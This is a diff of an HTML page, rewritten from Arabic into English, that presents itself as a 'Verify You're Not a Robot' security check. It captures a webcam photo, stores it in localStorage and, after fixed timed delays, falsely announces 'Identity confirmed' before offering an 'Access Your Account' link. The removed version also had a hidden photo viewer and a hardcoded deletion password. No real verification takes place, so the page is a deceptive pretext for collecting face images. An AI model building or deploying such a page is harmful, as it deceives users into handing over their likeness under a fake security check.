@@ -1,69 +1,96 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إثبات أنك لست روبوت</title>
+    <title>Verify You're Not a Robot</title>
     <script defer src="https://cdnjs.cloudflare.com/ajax/libs/face-api.js/1.3.0/face-api.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            background-color: black;
+            background-color: #000;
             color: white;
             margin: 0;
             padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         .container {
-            margin-top: 50px;
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 3px solid gold;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 500px;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
         }
-        video, canvas {
+        h2 {
+            color: gold;
+            margin-bottom: 20px;
+        }
+        .camera-frame {
             width: 300px;
-            border: 3px solid white;
+            height: 300px;
+            margin: 0 auto;
+            border: 2px solid gold;
             border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+            background-color: #111;
         }
-        button {
-            background-color: green;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 10px;
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
-        button:hover {
-            background-color: darkgreen;
-        }
-        .terms-box {
-            background-color: white;
-            color: black;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 14px;
-            cursor: pointer;
-            display: inline-block;
-            margin-top: 30px;
-        }
-        #go-to-balance {
+        canvas {
             display: none;
-            background-color: yellow;
+        }
+        .btn {
+            background-color: gold;
             color: black;
-            padding: 10px 20px;
+            padding: 12px 25px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            margin-top: 10px;
+            font-weight: bold;
+            margin: 15px 5px;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            background-color: #ffd700;
+            box-shadow: 0 0 10px gold;
+        }
+        .btn-transparent {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        .btn-active {
+            opacity: 1;
+            pointer-events: auto;
+            background-color: gold;
         }
         .loader {
             width: 50px;
             height: 50px;
-            border: 5px solid white;
-            border-top: 5px solid green;
+            border: 5px solid rgba(255, 215, 0, 0.2);
+            border-top: 5px solid gold;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 20px auto;
+            display: none;
+        }
+        .verification-text {
+            margin: 15px 0;
+            color: #ccc;
+        }
+        .security-badge {
+            color: gold;
+            font-size: 14px;
+            margin-top: 20px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -74,18 +101,20 @@
 <body>
 
     <div class="container">
-        <h2>الرجاء إثبات أنك لست روبوت</h2>
-        <video id="camera" autoplay></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-        <br>
-        <button id="capture-btn" onclick="capturePhoto()">التقاط الصورة</button>
-        <div id="loading" class="loader" style="display:none;"></div>
-        <br>
-        <div id="saved-photos" style="display:none; margin-top:20px;"></div>
-        <br>
-        <div class="terms-box" onclick="showPhotos()">📜 البنود</div>
-        <br>
-        <button id="go-to-balance" onclick="goToBalance()">الانتقال إلى الحساب</button>
+        <h2>Security Verification</h2>
+        <p class="verification-text">Please verify you're not a robot by taking a photo</p>
+        
+        <div class="camera-frame">
+            <video id="camera" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        
+        <p class="security-badge">🔒 Secure Identity Verification</p>
+        
+        <button id="capture-btn" class="btn" onclick="capturePhoto()">Take Photo</button>
+        <div id="loading" class="loader"></div>
+        
+        <button id="go-to-balance" class="btn btn-transparent" onclick="goToBalance()">Access Your Account</button>
     </div>
 
     <script>
@@ -93,66 +122,56 @@
         const canvas = document.getElementById('canvas');
         const captureBtn = document.getElementById('capture-btn');
         const goToBalanceBtn = document.getElementById('go-to-balance');
-        const savedPhotosContainer = document.getElementById('saved-photos');
         const loadingSpinner = document.getElementById('loading');
 
-        // تشغيل الكاميرا
+        // Start camera
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => video.srcObject = stream)
-            .catch(err => console.error("فشل في الوصول إلى الكاميرا", err));
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Camera access error:", err);
+                alert("Could not access camera. Please enable camera permissions.");
+            });
 
-        // التقاط الصورة عند الضغط على الزر
+        // Capture photo function
         function capturePhoto() {
-            captureBtn.disabled = true; // تعطيل الزر أثناء التقاط الصورة
-            loadingSpinner.style.display = "block"; // إظهار الدائرة الخضراء
-
+            // Disable capture button during process
+            document.getElementById('capture-btn').disabled = true;
+            loadingSpinner.style.display = "block";
+            
+            // Show verification message
+            document.querySelector('.verification-text').textContent = "Verifying your identity...";
+            
+            // Capture after 2 seconds (simulate processing)
             setTimeout(() => {
                 const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const capturedPhoto = canvas.toDataURL("image/png"); // حفظ الصورة
-                let storedPhotos = JSON.parse(localStorage.getItem("savedPhotos")) || [];
-                storedPhotos.push(capturedPhoto);
-                localStorage.setItem("savedPhotos", JSON.stringify(storedPhotos));
-
+                
+                // Save photo to localStorage (simulated)
+                const photoData = canvas.toDataURL('image/png');
+                localStorage.setItem('verificationPhoto', photoData);
+                
+                // Complete verification after 3 more seconds
                 setTimeout(() => {
-                    loadingSpinner.style.display = "none"; // إخفاء الدائرة بعد 7 ثوانٍ
-                    goToBalanceBtn.style.display = "block"; // إظهار زر الانتقال إلى الحساب
-                }, 7000); // عرض الدائرة لمدة 7 ثوانٍ
-            }, 3000); // التقاط الصورة بعد 3 ثوانٍ من الضغط على الزر
+                    loadingSpinner.style.display = "none";
+                    document.querySelector('.verification-text').innerHTML = 
+                        "✓ Verification complete<br><small>Identity confirmed</small>";
+                    
+                    // Enable and highlight the access button
+                    goToBalanceBtn.classList.remove('btn-transparent');
+                    goToBalanceBtn.classList.add('btn-active');
+                    
+                    // Change capture button text
+                    document.getElementById('capture-btn').textContent = "Retake Photo";
+                    document.getElementById('capture-btn').disabled = false;
+                }, 3000);
+            }, 2000);
         }
 
-        // عرض الصور المحفوظة عند الضغط على البنود
-        function showPhotos() {
-            const storedPhotos = JSON.parse(localStorage.getItem("savedPhotos")) || [];
-            if (storedPhotos.length > 0) {
-                savedPhotosContainer.innerHTML = "";
-                storedPhotos.forEach(photo => {
-                    const img = document.createElement("img");
-                    img.src = photo;
-                    img.width = 200;
-                    img.style.margin = "10px";
-                    img.style.border = "2px solid white";
-                    img.style.borderRadius = "10px";
-                    savedPhotosContainer.appendChild(img);
-                });
-                savedPhotosContainer.style.display = "block";
-
-                // التحقق من كلمة السر إذا كانت "silversonic" لحذف الصور
-                const password = prompt("أدخل كلمة السر لحذف الصور (إن وجدت):");
-                if (password === "silversonic") {
-                    localStorage.removeItem("savedPhotos");
-                    alert("تم حذف الصور.");
-                    savedPhotosContainer.innerHTML = "";
-                }
-            } else {
-                alert("⚠ لم يتم التقاط أي صورة بعد!");
-            }
-        }
-
-        // الانتقال إلى صفحة الحساب
+        // Go to balance page
         function goToBalance() {
             window.location.href = "balance.html";
         }
